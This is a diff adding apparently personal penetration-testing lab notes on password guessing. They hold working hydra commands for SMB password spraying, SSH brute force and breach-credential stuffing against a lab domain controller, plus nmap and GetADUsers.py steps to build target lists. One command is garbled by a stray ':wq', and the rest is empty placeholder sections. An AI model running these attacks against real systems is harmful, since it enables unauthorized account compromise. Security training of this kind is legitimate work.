@@ -1,0 +1,70 @@
+{{{ Section: 2.1 Password Guessing ================================================================
+
+
+\\ lab
+
+// SMB pass spray 
+hydra -L /opt/passwords/facebook-f.last-100.txt -p Spring2023 -m workgroup:{hiboxy} 10.130.10.4 smb2
+
+    -L /opt/passwords/facebook-f.last-100.txt: Use a list of username
+    -p SEASONYEAR: Use the exact current SeasonYear password (ex: "Spring2022")
+    -m workgroup:{hiboxy}: We are connecting to a domain controller and we need to specify the domain (note: you need the {}),
+    10.130.10.4: IP address of the domain controller (found with scanning)
+    smb2: Protocol
+
+
+// password guessing 
+determine list 
+
+hydra -l bgreen -P /opt/passwords/simple.txt 10.130.10.10 ssh
+> GOT CREDS 
+
+// pipe nmap output 2 && 
+nmap -n -Pn -p 445 --open -oA /tmp/smb 10.130.10.0/24
+grep 445/open /tmp/smb.gnmap | cut -d' ' -f 2 | tee /tmp/smbservers.txt
+hydra -m workgroup:{hiboxy} -l bgreen -p Password1 -M /tm:wq
+p/smbservers.txt smb2
+
+// use breached creds 
+cat /opt/passwords/hiboxy-breach.txt
+hydra -C /opt/passwords/hiboxy-breach.txt 10.130.10.4 -m workgroup:{hiboxy} smb2
+
+// PW spraying for all domain users 
+GetADUsers.py hiboxy.com/bgreen:Password1 -dc-ip 10.130.10.4 -all | tee /tmp/adusers.txt
+tail -n +6 /tmp/adusers.txt | cut -d ' ' -f 1 | tee /tmp/domainusers.txt
+        extract user list 
+hydra -L /tmp/domainusers.txt -p Password1 -m workgroup:{hiboxy} 10.130.10.4 smb2
+        bf using domain usernames 
+
+===================================================================}}}
+
+{{{ Section: X ================================================================
+
+
+
+===================================================================}}}
+
+{{{ Section: X ================================================================
+
+
+
+===================================================================}}}
+
+{{{ Section: X ================================================================
+
+
+
+===================================================================}}}
+
+{{{ Section: X ================================================================
+
+
+
+===================================================================}}}
+
+{{{ Section: X ================================================================
+
+
+
+===================================================================}}}
+
